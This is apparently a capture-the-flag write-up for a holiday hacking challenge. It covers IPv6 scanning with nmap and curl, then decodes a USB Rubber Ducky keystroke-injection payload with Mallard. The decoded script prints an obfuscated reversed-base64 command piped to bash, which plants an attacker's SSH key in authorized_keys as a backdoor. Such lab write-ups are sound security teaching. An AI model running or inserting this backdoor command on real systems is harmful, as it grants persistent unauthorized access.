# 5) Strange USB Device

_Difficulty:_  :evergreen_tree: :evergreen_tree:

> Assist the elves in reverse engineering the strange USB device. Visit Santa's
> Talks Floor and hit up _Jewel Loggins_ for advice.

Jewel Loggins

> Well hello! I'm Jewel Loggins.  I have to say though, I'm a bit distressed.
> The con next door? Oh sure, I’m concerned about that too, but I was talking
> about the issues I’m having with IPv6.  I mean, I know it's an old protocol
> now, but I've just never checked it out.  So now I'm trying to do simple
> things like Nmap and cURL using IPv6, and I can't quite get them working!
> Would you mind taking a look for me on this terminal?  I think there's a
> Github Gist that covers tool usage with IPv6 targets.  The tricky parts are
> knowing when to use `[]` around IPv6 addresses and where to specify the source
> interface.  I’ve got a deal for you. If you show me how to solve this
> terminal, I’ll provide you with some nice tips about a topic I’ve been
> researching a lot lately – Ducky Scripts! They can be really interesting and
> fun!
\
> :link: **Tool Syntax with IPv6** [link](https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f)

## Challenge: Cranberry Pi Logic Munchers

```sh
$ ping6 ff02::2 -c2
$ nmap -6 fe80::42:c0ff:fea8:a002%eth0
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-23 12:21 UTC
Nmap scan report for fe80::42:c0ff:fea8:a002
Host is up (0.000080s latency)
Not shown: 998 closed ports.
PORT     STATE SERVICE.
80/tcp   open  http.
9000/tcp open  cslistener
$ curl http://[fe80::42:c0ff:fea8:a002]:9000 --interface eth0
PieceOnEarth
```

Jewl Loggins

> Great work! It seems simpler now that I've seen it once. Thanks for showing me!
> Prof. Petabyte warned us about random USB devices. They might be malicious
> keystroke injectors!  A troll could program a keystroke injector to deliver
> malicious keystrokes when it is plugged in.  Ducky Script is a language used to
> specify those keystrokes.  What commands would a troll try to run on our
> workstations?  I heard that SSH keys can be used as backdoors. Maybe that's
> useful?
\
> :link: **Account Manipulation: SSH Authorized Keys** \
     [link](https://attack.mitre.org/techniques/T1098/004/)

* [Ducky Script][ducky-script] is the language for the USB Rubber Ducky
* Attackers can encode Ducky Script using a [duck encoder][duck-encoder] \
    for delivery as `inject.bin`
* It's also possible the reverse engineer encoded Ducky Script using [Mallard][mallard]

[ducky-script]: https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language
[duck-encoder]: https://docs.hak5.org/hc/en-us/articles/360010471234-Writing-your-first-USB-Rubber-Ducky-Payload
[mallard](https://github.com/dagonis/Mallard)

> What is the troll **username** involved with this attack? -> Answer: _ickymcgoop_

`python Mallard/mallard -f ./input.bin > ducky_script.txt`

```text
ENTER
DELAY 1000
...
DELAY 200
STRING echo ==gCzlXZr9FZlpXa....VBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
ENTER
DELAY 600
```

Executing `echo ==gCzlXZr9FZlpXa....VBSYzJXLoboNWZ | rev | base64 -d | bash` yields

```sh
echo 'ssh-rsa UmN5RHJZWHdr...SUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
```
